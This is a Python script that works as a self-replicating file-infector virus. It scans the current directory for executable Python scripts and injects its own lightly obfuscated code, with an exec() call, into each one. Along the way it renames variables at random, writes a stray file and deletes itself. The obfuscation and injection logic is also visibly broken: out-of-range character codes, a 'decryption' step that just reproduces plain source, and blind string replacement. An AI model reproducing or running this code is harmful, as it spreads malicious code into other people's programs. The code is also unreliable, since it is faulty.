import os
import random

# Read own code
with open(__file__, 'r') as f:
    code = f.read()

# Find files to encrypt
for filename in os.listdir():
    filepath = os.path.abspath(filename)

    # Check if file is eligible for encryption
    if os.path.isfile(filepath) and os.access(filepath, os.R_OK | os.W_OK | os.X_OK):
        with open(filepath, 'r') as f:
            first_line = f.readline().strip()

            if first_line.startswith('#!') and 'python' in first_line.lower():

                # Generate a crypt key
                key = random.randint(0, 255)

                # Choose encryption method
                encrypt_type = random.choice(['multiply', 'add'])

                # Encrypt own code
                encrypted_code = ''
                for char in code:
                    if encrypt_type == 'multiply':
                        encrypted_char = ord(char) * key
                    else:
                        encrypted_char = ord(char) + key

                    encrypted_code += chr(encrypted_char)

                # Create encrypted string
                separator = chr(random.randint(65, 90))
                encrypted_string = separator.join(encrypted_code)

                # Generate a random filename
                encrypted_filename = ''.join([chr(random.randint(65, 90)), str(random.randint(0, 65535))])

                # Create decryption routine
                decrypt_code = ''
                for char in encrypted_code:
                    if encrypt_type == 'multiply':
                        decrypted_char = ord(char) // key
                    else:
                        decrypted_char = ord(char) - key

                    decrypt_code += chr(decrypted_char)

                decrypt_code += '\nexec(code)'

                # Replace variables
                variables = {'code', 'key', 'encrypted_string', 'decrypt_code'}
                for var in variables:
                    new_var = ''.join([chr(random.randint(65, 90)), str(random.randint(0, 65535))])
                    code = code.replace(var, new_var)
                    decrypt_code = decrypt_code.replace(var, new_var)

                # Insert encrypted code
                with open(filepath, 'r') as f:
                    file_contents = f.read()

                insert_index = file_contents.find(';\n') + 2
                if insert_index == 1:
                    with open(filepath, 'a') as f:
                        f.write('\n' + encrypted_string + '\n' + decrypt_code)
                else:
                    with open(filepath, 'w') as f:
                        f.write(file_contents[:insert_index] + '\n' + encrypted_string + '\n' + decrypt_code + file_contents[insert_index:])

                # Write encrypted code to file
                with open(encrypted_filename, 'w') as f:
                    f.write(encrypted_string)

                # Delete itself
                os.remove(__file__)
